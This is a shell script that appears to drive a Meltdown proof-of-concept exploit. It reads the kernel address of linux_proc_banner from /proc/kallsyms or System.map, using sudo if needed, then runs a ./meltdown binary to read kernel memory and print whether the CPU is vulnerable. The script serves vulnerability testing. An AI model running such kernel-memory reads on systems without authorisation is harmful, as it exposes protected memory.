#!/bin/sh

find_linux_proc_banner() {
	$2 awk '
	/linux_proc_banner/ {
		if (strtonum("0x"$1))
			print $1;
		exit 0;
	}' $1
}

echo "looking for linux_proc_banner in /proc/kallsyms"
linux_proc_banner=$(find_linux_proc_banner /proc/kallsyms)
if test -z $linux_proc_banner; then
	echo "protected. requires root"
	set -x
	linux_proc_banner=$(\
		find_linux_proc_banner /proc/kallsyms sudo)

	set +x
fi
if test -z $linux_proc_banner; then
	echo "not found. reading /boot/System.map-$(uname -r)"
	set -x
	linux_proc_banner=$(\
		find_linux_proc_banner /boot/System.map-$(uname -r) sudo)
	set +x
fi

./meltdown $linux_proc_banner 10
vuln=$?

if test $vuln -eq 132; then
	echo "ILLEGAL INSTRUCTION"
	echo "try recompile with:"
	echo " make CFLAGS='-DHAVE_RDTSCP=0' clean all"
	echo "and run again"
fi
if test $vuln -eq 1; then
	echo "VULNERABLE ON"
	uname -rvi
	head /proc/cpuinfo
	exit 1
fi
